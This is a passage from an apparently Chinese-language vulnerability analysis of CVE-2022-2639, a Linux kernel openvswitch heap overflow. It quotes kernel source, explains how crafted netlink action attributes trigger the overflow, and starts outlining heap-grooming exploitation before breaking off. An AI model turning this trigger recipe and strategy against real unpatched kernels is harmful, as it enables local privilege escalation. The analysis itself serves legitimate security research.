<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_ROUTE		0	<span class="comment">/* Routing/device hook				*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_UNUSED		1	<span class="comment">/* Unused number				*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_USERSOCK	2	<span class="comment">/* Reserved for user mode socket protocols 	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_FIREWALL	3	<span class="comment">/* Unused number, formerly ip_queue		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_SOCK_DIAG	4	<span class="comment">/* socket monitoring				*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_NFLOG		5	<span class="comment">/* netfilter/iptables ULOG */</span></span></span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_IP6_FW		13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_DNRTMSG		14	<span class="comment">/* DECnet routing messages */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_KOBJECT_UEVENT	15	<span class="comment">/* Kernel messages to userspace */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_GENERIC		16</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>而我们的openvswitch属于<code>NETLINK_GENERIC</code>，因此在<code>struct nlmsghdr</code>中还得包着<code>struct genlmsghdr</code>；再在这里面才是喂给openvswitch的数据，也就是前面提到的<code>struct nlattr</code>。而前面的漏洞位于拷贝flow actions的场景中，而 flow actions 又是主<code>struct nlattr</code>中的一个子<code>struct nlattr</code>。</p>
<p>因此在这种层层限制下，第一层nlattr的长度就已经不超过0xFFFF了，那自然子nlattr的长度之和也没法超过0x10000了。</p>
<p>看起来确实没戏了？？</p>
<h3 id="It’s-a-vulnerability"><a href="#It’s-a-vulnerability" class="headerlink" title="It’s a vulnerability !!"></a>It’s a vulnerability !!</h3><p>在<code>__ovs_nla_copy_actions()</code>中有如下一段代码，描述了各个action attr的数据长度，其中-1表示不定长，否则为定长。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; linux-5.13/net/openvswitch/flow_netlink.c:3047</span></span><br><span class="line"><span class="comment">/* 3047 */</span> 		<span class="type">static</span> <span class="type">const</span> u32 action_lens[OVS_ACTION_ATTR_MAX + <span class="number">1</span>] = &#123;</span><br><span class="line"><span class="comment">/* 3048 */</span> 			[OVS_ACTION_ATTR_OUTPUT] = <span class="keyword">sizeof</span>(u32),</span><br><span class="line"><span class="comment">/* 3049 */</span> 			[OVS_ACTION_ATTR_RECIRC] = <span class="keyword">sizeof</span>(u32),</span><br><span class="line"><span class="comment">/* 3050 */</span> 			[OVS_ACTION_ATTR_USERSPACE] = (u32)<span class="number">-1</span>,</span><br><span class="line"><span class="comment">/* 3051 */</span> 			[OVS_ACTION_ATTR_PUSH_MPLS] = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ovs_action_push_mpls),</span><br><span class="line"><span class="comment">/* 3052 */</span> 			[OVS_ACTION_ATTR_POP_MPLS] = <span class="keyword">sizeof</span>(__be16),</span><br><span class="line"><span class="comment">/* 3053 */</span> 			[OVS_ACTION_ATTR_PUSH_VLAN] = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ovs_action_push_vlan),</span><br><span class="line"><span class="comment">/* 3054 */</span> 			[OVS_ACTION_ATTR_POP_VLAN] = <span class="number">0</span>,</span><br><span class="line"><span class="comment">/* 3055 */</span> 			[OVS_ACTION_ATTR_SET] = (u32)<span class="number">-1</span>,</span><br><span class="line"><span class="comment">/* 3056 */</span> 			[OVS_ACTION_ATTR_SET_MASKED] = (u32)<span class="number">-1</span>,</span><br><span class="line"><span class="comment">/* 3057 */</span> 			[OVS_ACTION_ATTR_SAMPLE] = (u32)<span class="number">-1</span>,</span><br><span class="line"><span class="comment">/* 3058 */</span> 			[OVS_ACTION_ATTR_HASH] = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ovs_action_hash),</span><br><span class="line"><span class="comment">/* 3059 */</span> 			[OVS_ACTION_ATTR_CT] = (u32)<span class="number">-1</span>,</span><br><span class="line"><span class="comment">/* 3060 */</span> 			[OVS_ACTION_ATTR_CT_CLEAR] = <span class="number">0</span>,</span><br><span class="line"><span class="comment">/* 3061 */</span> 			[OVS_ACTION_ATTR_TRUNC] = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ovs_action_trunc),</span><br><span class="line"><span class="comment">/* 3062 */</span> 			[OVS_ACTION_ATTR_PUSH_ETH] = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ovs_action_push_eth),</span><br><span class="line"><span class="comment">/* 3063 */</span> 			[OVS_ACTION_ATTR_POP_ETH] = <span class="number">0</span>,</span><br><span class="line"><span class="comment">/* 3064 */</span> 			[OVS_ACTION_ATTR_PUSH_NSH] = (u32)<span class="number">-1</span>,</span><br><span class="line"><span class="comment">/* 3065 */</span> 			[OVS_ACTION_ATTR_POP_NSH] = <span class="number">0</span>,</span><br><span class="line"><span class="comment">/* 3066 */</span> 			[OVS_ACTION_ATTR_METER] = <span class="keyword">sizeof</span>(u32),</span><br><span class="line"><span class="comment">/* 3067 */</span> 			[OVS_ACTION_ATTR_CLONE] = (u32)<span class="number">-1</span>,</span><br><span class="line"><span class="comment">/* 3068 */</span> 			[OVS_ACTION_ATTR_CHECK_PKT_LEN] = (u32)<span class="number">-1</span>,</span><br><span class="line"><span class="comment">/* 3069 */</span> 			[OVS_ACTION_ATTR_ADD_MPLS] = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ovs_action_add_mpls),</span><br><span class="line"><span class="comment">/* 3070 */</span> 			[OVS_ACTION_ATTR_DEC_TTL] = (u32)<span class="number">-1</span>,</span><br><span class="line"><span class="comment">/* 3071 */</span> 		&#125;;</span><br></pre></td></tr></table></figure>

<p>一般来说，我们传入的子nlattr和最后add action中的长度是一致的，比如上面的<code>OVS_ACTION_ATTR_PUSH_MPLS</code>，它的长度固定为<code>sizeof(struct ovs_action_push_mpls)</code>，简单做一下校验就会传入通用的<code>copy_action()</code>函数中，因为<code>skip_copy = false</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; ../ubuntu-focal/net/openvswitch/flow_netlink.c:3081</span></span><br><span class="line"><span class="comment">/* 3081 */</span> 		skip_copy = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">/* 3082 */</span> 		<span class="keyword">switch</span> (type) &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3165 */</span> 		<span class="keyword">case</span> OVS_ACTION_ATTR_PUSH_MPLS: &#123;</span><br><span class="line"><span class="comment">/* 3166 */</span> 			<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ovs_action_push_mpls</span> *<span class="title">mpls</span> =</span> nla_data(a);</span><br><span class="line"><span class="comment">/* 3167 */</span> </span><br><span class="line"><span class="comment">/* 3168 */</span> 			<span class="keyword">if</span> (!eth_p_mpls(mpls-&gt;mpls_ethertype))</span><br><span class="line"><span class="comment">/* 3169 */</span> 				<span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="comment">/* 3170 */</span> 			<span class="comment">/* Prohibit push MPLS other than to a white list</span></span><br><span class="line"><span class="comment">/* 3171 */</span> 			 * <span class="keyword">for</span> packets that have a known tag order.</span><br><span class="line"><span class="comment">/* 3172 */</span> 			 */</span><br><span class="line"><span class="comment">/* 3173 */</span> 			<span class="keyword">if</span> (vlan_tci &amp; htons(VLAN_CFI_MASK) ||</span><br><span class="line"><span class="comment">/* 3174 */</span> 			    (eth_type != htons(ETH_P_IP) &amp;&amp;</span><br><span class="line"><span class="comment">/* 3175 */</span> 			     eth_type != htons(ETH_P_IPV6) &amp;&amp;</span><br><span class="line"><span class="comment">/* 3176 */</span> 			     eth_type != htons(ETH_P_ARP) &amp;&amp;</span><br><span class="line"><span class="comment">/* 3177 */</span> 			     eth_type != htons(ETH_P_RARP) &amp;&amp;</span><br><span class="line"><span class="comment">/* 3178 */</span> 			     !eth_p_mpls(eth_type)))</span><br><span class="line"><span class="comment">/* 3179 */</span> 				<span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="comment">/* 3180 */</span> 			eth_type = mpls-&gt;mpls_ethertype;</span><br><span class="line"><span class="comment">/* 3181 */</span> 			mpls_label_count++;</span><br><span class="line"><span class="comment">/* 3182 */</span> 			<span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* 3183 */</span> 		&#125;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3344 */</span> 		<span class="keyword">if</span> (!skip_copy) &#123;</span><br><span class="line"><span class="comment">/* 3345 */</span> 			err = copy_action(a, sfa, <span class="built_in">log</span>);</span><br><span class="line"><span class="comment">/* 3346 */</span> 			<span class="keyword">if</span> (err)</span><br><span class="line"><span class="comment">/* 3347 */</span> 				<span class="keyword">return</span> err;</span><br><span class="line"><span class="comment">/* 3348 */</span> 		&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但通过仔细观察，其中有若干特例，例如<code>OVS_ACTION_ATTR_CT</code>可以拿来利用，首先它设置了<code>skip_copy = true</code>，说明copy action它会在<code>ovs_ct_copy_action()</code>中自己来拷贝。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; linux-5.13/net/openvswitch/flow_netlink.c:3246</span></span><br><span class="line"><span class="comment">/* 3246 */</span> 		<span class="keyword">case</span> OVS_ACTION_ATTR_CT:</span><br><span class="line"><span class="comment">/* 3247 */</span> 			err = ovs_ct_copy_action(net, a, key, sfa, <span class="built_in">log</span>);</span><br><span class="line"><span class="comment">/* 3248 */</span> 			<span class="keyword">if</span> (err)</span><br><span class="line"><span class="comment">/* 3249 */</span> 				<span class="keyword">return</span> err;</span><br><span class="line"><span class="comment">/* 3250 */</span> 			skip_copy = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* 3251 */</span> 			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &gt;&gt;&gt; linux-5.13/net/openvswitch/conntrack.c:1667</span></span><br><span class="line"><span class="comment">/* 1667 */</span> <span class="type">int</span> <span class="title function_">ovs_ct_copy_action</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="type">const</span> <span class="keyword">struct</span> nlattr *attr,</span></span><br><span class="line"><span class="params"><span class="comment">/* 1668 */</span> 		       <span class="type">const</span> <span class="keyword">struct</span> sw_flow_key *key,</span></span><br><span class="line"><span class="params"><span class="comment">/* 1669 */</span> 		       <span class="keyword">struct</span> sw_flow_actions **sfa,  <span class="type">bool</span> <span class="built_in">log</span>)</span></span><br><span class="line"><span class="comment">/* 1670 */</span> &#123;</span><br><span class="line"><span class="comment">/* 1671 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">ovs_conntrack_info</span> <span class="title">ct_info</span>;</span></span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 1688 */</span> 	err = parse_ct(attr, &amp;ct_info, &amp;helper, <span class="built_in">log</span>);</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 1716 */</span> 	err = ovs_nla_add_action(sfa, OVS_ACTION_ATTR_CT, &amp;ct_info,</span><br><span class="line"><span class="comment">/* 1717 */</span> 				 <span class="keyword">sizeof</span>(ct_info), <span class="built_in">log</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而在<code>parse_ct()</code>中，我们只需要8字节就能构造出合法的nlattr。而在1716行add action时传入的结构体却是<code>struct ovs_conntrack_info</code>，且大小为<code>sizeof(struct ovs_conntrack_info)</code>。</p>
<p>这个结构体在 Kernel 5.13 中为<code>0xA0</code>字节，这就起到了放大的作用！</p>
<p>假设我们添加500个<code>OVS_ACTION_ATTR_CT</code>的nlattr，那只用了<code>500*8 = 0xFA0</code>字节的nlattr长度，却让我们最前面提到的buffer的next_offset成功增加了<code>0x500*0xa0 = 0x13880</code>字节！溢出发生！！</p>
<p>但使用<code>struct ovs_conntrack_info</code>对编写exploit有个坏处，就是这个结构体在内核版本的更迭中被修改过多次，导致在不同版本的内核其大小并不固定。</p>
<p>为了解决这个痛点，只能去寻找其他的结构体，然后，我找到了<code>OVS_ACTION_ATTR_SET</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; linux-5.13/net/openvswitch/flow_netlink.c:3217</span></span><br><span class="line"><span class="comment">/* 3217 */</span> 		<span class="keyword">case</span> OVS_ACTION_ATTR_SET:</span><br><span class="line"><span class="comment">/* 3218 */</span> 			err = validate_set(a, key, sfa,</span><br><span class="line"><span class="comment">/* 3219 */</span> 					   &amp;skip_copy, mac_proto, eth_type,</span><br><span class="line"><span class="comment">/* 3220 */</span> 					   <span class="literal">false</span>, <span class="built_in">log</span>);</span><br><span class="line"><span class="comment">/* 3221 */</span> 			<span class="keyword">if</span> (err)</span><br><span class="line"><span class="comment">/* 3222 */</span> 				<span class="keyword">return</span> err;</span><br><span class="line"><span class="comment">/* 3223 */</span> 			<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>这里看起来没有主动设置<code>skip_copy</code>，但仔细看会发现它将<code>skip_copy</code>指针拷贝到了<code>validate_set()</code>中进行处理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; ../ubuntu-focal/net/openvswitch/flow_netlink.c:2744</span></span><br><span class="line"><span class="comment">/* 2744 */</span> <span class="type">static</span> <span class="type">int</span> <span class="title function_">validate_set</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nlattr *a,</span></span><br><span class="line"><span class="params"><span class="comment">/* 2745 */</span> 			<span class="type">const</span> <span class="keyword">struct</span> sw_flow_key *flow_key,</span></span><br><span class="line"><span class="params"><span class="comment">/* 2746 */</span> 			<span class="keyword">struct</span> sw_flow_actions **sfa, <span class="type">bool</span> *skip_copy,</span></span><br><span class="line"><span class="params"><span class="comment">/* 2747 */</span> 			u8 mac_proto, __be16 eth_type, <span class="type">bool</span> masked, <span class="type">bool</span> <span class="built_in">log</span>)</span></span><br><span class="line"><span class="comment">/* 2748 */</span> &#123;</span><br><span class="line">    		<span class="comment">// 取出内层嵌套的nlattr</span></span><br><span class="line"><span class="comment">/* 2749 */</span> 	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">ovs_key</span> =</span> nla_data(a);</span><br><span class="line"><span class="comment">/* 2750 */</span> 	<span class="type">int</span> key_type = nla_type(ovs_key);</span><br><span class="line"><span class="comment">/* 2751 */</span> 	<span class="type">size_t</span> key_len;</span><br><span class="line">------</span><br><span class="line">    		<span class="comment">// data length 作为 key_len</span></span><br><span class="line"><span class="comment">/* 2757 */</span> 	key_len = nla_len(ovs_key);</span><br><span class="line">    		<span class="comment">// 从OVS_ACTION_ATTR_SET走不设置masked</span></span><br><span class="line"><span class="comment">/* 2758 */</span> 	<span class="keyword">if</span> (masked)</span><br><span class="line"><span class="comment">/* 2759 */</span> 		key_len /= <span class="number">2</span>;</span><br><span class="line">------</span><br><span class="line">    		<span class="comment">// 注意这里的check_attr_len(), key_len 不是随便给的</span></span><br><span class="line"><span class="comment">/* 2761 */</span> 	<span class="keyword">if</span> (key_type &gt; OVS_KEY_ATTR_MAX ||</span><br><span class="line"><span class="comment">/* 2762 */</span> 	    !check_attr_len(key_len, ovs_key_lens[key_type].len))</span><br><span class="line"><span class="comment">/* 2763 */</span> 		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 2768 */</span> 	<span class="keyword">switch</span> (key_type) &#123;</span><br><span class="line">------</span><br><span class="line">    		<span class="comment">// 对 key_type == OVS_KEY_ATTR_ETHERNET 来说只是简单的check</span></span><br><span class="line"><span class="comment">/* 2775 */</span> 	<span class="keyword">case</span> OVS_KEY_ATTR_ETHERNET:</span><br><span class="line"><span class="comment">/* 2776 */</span> 		<span class="keyword">if</span> (mac_proto != MAC_PROTO_ETHERNET)</span><br><span class="line"><span class="comment">/* 2777 */</span> 			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="comment">/* 2778 */</span> 		<span class="keyword">break</span>;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 2883 */</span> 	&#125;</span><br><span class="line"><span class="comment">/* 2884 */</span> </span><br><span class="line">    		<span class="comment">// 进入这段关键逻辑</span></span><br><span class="line"><span class="comment">/* 2885 */</span> 	<span class="comment">/* Convert non-masked non-tunnel set actions to masked set actions. */</span></span><br><span class="line"><span class="comment">/* 2886 */</span> 	<span class="keyword">if</span> (!masked &amp;&amp; key_type != OVS_KEY_ATTR_TUNNEL) &#123;</span><br><span class="line">    			<span class="comment">// 注意到len为key_len的两倍</span></span><br><span class="line"><span class="comment">/* 2887 */</span> 		<span class="type">int</span> start, len = key_len * <span class="number">2</span>;</span><br><span class="line"><span class="comment">/* 2888 */</span> 		<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">at</span>;</span></span><br><span class="line"><span class="comment">/* 2889 */</span> </span><br><span class="line">    			<span class="comment">// 设置 skip_copy， 跳过外层的默认的copy_action</span></span><br><span class="line"><span class="comment">/* 2890 */</span> 		*skip_copy = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* 2891 */</span> </span><br><span class="line"><span class="comment">/* 2892 */</span> 		start = add_nested_action_start(sfa,</span><br><span class="line"><span class="comment">/* 2893 */</span> 						OVS_ACTION_ATTR_SET_TO_MASKED,</span><br><span class="line"><span class="comment">/* 2894 */</span> 						<span class="built_in">log</span>);</span><br><span class="line"><span class="comment">/* 2895 */</span> 		<span class="keyword">if</span> (start &lt; <span class="number">0</span>)</span><br><span class="line"><span class="comment">/* 2896 */</span> 			<span class="keyword">return</span> start;</span><br><span class="line"><span class="comment">/* 2897 */</span> </span><br><span class="line">    			<span class="comment">// 调用__add_action， 注意此处的len为key_len两倍</span></span><br><span class="line"><span class="comment">/* 2898 */</span> 		at = __add_action(sfa, key_type, <span class="literal">NULL</span>, len, <span class="built_in">log</span>);</span><br><span class="line"><span class="comment">/* 2899 */</span> 		<span class="keyword">if</span> (IS_ERR(at))</span><br><span class="line"><span class="comment">/* 2900 */</span> 			<span class="keyword">return</span> PTR_ERR(at);</span><br><span class="line"><span class="comment">/* 2901 */</span> </span><br><span class="line"><span class="comment">/* 2902 */</span> 		<span class="built_in">memcpy</span>(nla_data(at), nla_data(ovs_key), key_len); <span class="comment">/* Key. */</span></span><br><span class="line"><span class="comment">/* 2903 */</span> 		<span class="built_in">memset</span>(nla_data(at) + key_len, <span class="number">0xff</span>, key_len);    <span class="comment">/* Mask. */</span></span><br></pre></td></tr></table></figure>

<p>假设我们内部嵌套的nlattr type为<code>OVS_KEY_ATTR_ETHERNET</code>，首先要通过2762行对data length的校验，即length等于<code>sizeof(struct ovs_key_ethernet) == 0x0C</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; ../ubuntu-focal/net/openvswitch/flow_netlink.c:406</span></span><br><span class="line"><span class="comment">/* 406 */</span> <span class="comment">/* The size of the argument for each %OVS_KEY_ATTR_* Netlink attribute.  */</span></span><br><span class="line"><span class="comment">/* 407 */</span> <span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ovs_len_tbl</span> <span class="title">ovs_key_lens</span>[<span class="title">OVS_KEY_ATTR_MAX</span> + 1] =</span> &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 412 */</span> 	[OVS_KEY_ATTR_ETHERNET]	 = &#123; .len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ovs_key_ethernet) &#125;,</span><br></pre></td></tr></table></figure>

<p>之后关键逻辑出现在第2887行，最后添加的action长度为原长的两倍，即<code>0x18</code>。</p>
<p>算上添加这个nlattr所需的两层header（嵌套），即需要使用<code>0x04 + 0x04 + 0x0C == 0x14</code>字节的内存就让最前面提出的buffer的指针前进<code>0x04 + 0x04 + 0x0C * 2 == 0x20</code>字节。虽然放大比例不如<code>sizeof(struct ovs_conntrack_info)</code>，但好在其在能用来溢出的前提下，保证了更优的稳定性（无需根据内核版本来计算结构体的大小）。</p>
<p>可以在<code>copy_action()</code>的<code>memcpy</code>处（3031行）观察到此次溢出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; linux-5.13/net/openvswitch/flow_netlink.c:3021</span></span><br><span class="line"><span class="comment">/* 3021 */</span> <span class="type">static</span> <span class="type">int</span> <span class="title function_">copy_action</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nlattr *from,</span></span><br><span class="line"><span class="params"><span class="comment">/* 3022 */</span> 		       <span class="keyword">struct</span> sw_flow_actions **sfa, <span class="type">bool</span> <span class="built_in">log</span>)</span></span><br><span class="line"><span class="comment">/* 3023 */</span> &#123;</span><br><span class="line"><span class="comment">/* 3024 */</span> 	<span class="type">int</span> totlen = NLA_ALIGN(from-&gt;nla_len);</span><br><span class="line"><span class="comment">/* 3025 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">to</span>;</span></span><br><span class="line"><span class="comment">/* 3026 */</span> </span><br><span class="line"><span class="comment">/* 3027 */</span> 	to = reserve_sfa_size(sfa, from-&gt;nla_len, <span class="built_in">log</span>);</span><br><span class="line"><span class="comment">/* 3028 */</span> 	<span class="keyword">if</span> (IS_ERR(to))</span><br><span class="line"><span class="comment">/* 3029 */</span> 		<span class="keyword">return</span> PTR_ERR(to);</span><br><span class="line"><span class="comment">/* 3030 */</span> </span><br><span class="line"><span class="comment">/* 3031 */</span> 	<span class="built_in">memcpy</span>(to, from, totlen);</span><br><span class="line"><span class="comment">/* 3032 */</span> 	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* 3033 */</span> &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512224846125.png" alt="image-20220512224846125"></p>
<p><img src="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512225001216.png" alt="image-20220512225001216"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在POC中我们可以清晰的看到heap上发生了buffer overflow，且溢出发生在0x10000的堆块上。</p>
<p>根据之前漏洞利用的经验，我还是打算请出我的老朋友<code>struct msg_msg</code>。但相信有点经验的朋友都会发现，msg最大只能申请0x1000的chunk，完全不是一个量级，也不在一个slab中。因此如果只是简单的堆喷msg_msg结构体并不能保证发生溢出的0x10000堆块后正好紧跟着<code>struct msg_msg</code>。</p>
<p>因此这里需要一些page level的风水技巧。这边非常感谢<a target="_blank" rel="noopener" href="https://etenal.me/">@etenal</a>在<a target="_blank" rel="noopener" href="https://etenal.me/archives/1825">CVE-2022-27666</a>中提供的思路。某些原理和常识请移步etenal的分析，下面我直接讲我的操作。</p>
<p>首先介绍这次的风水好帮手<code>packet rx_ring buffer</code>，它能够帮助我们申请0x10000的chunk且在需要释放的时候释放。它的申请位置如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; linux-5.13/net/packet/af_packet.c:3695</span></span><br><span class="line"><span class="comment">/* 3695 */</span> <span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="comment">/* 3696 */</span> packet_setsockopt(<span class="keyword">struct</span> socket *sock, <span class="type">int</span> level, <span class="type">int</span> optname, <span class="type">sockptr_t</span> optval,</span><br><span class="line"><span class="comment">/* 3697 */</span> 		  <span class="type">unsigned</span> <span class="type">int</span> optlen)</span><br><span class="line"><span class="comment">/* 3698 */</span> &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3706 */</span> 	<span class="keyword">switch</span> (optname) &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3711 */</span> 		<span class="type">int</span> len = optlen;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3728 */</span> 	<span class="keyword">case</span> PACKET_RX_RING:</span><br><span class="line"><span class="comment">/* 3729 */</span> 	<span class="keyword">case</span> PACKET_TX_RING:</span><br><span class="line"><span class="comment">/* 3730 */</span> 	&#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3735 */</span> 		<span 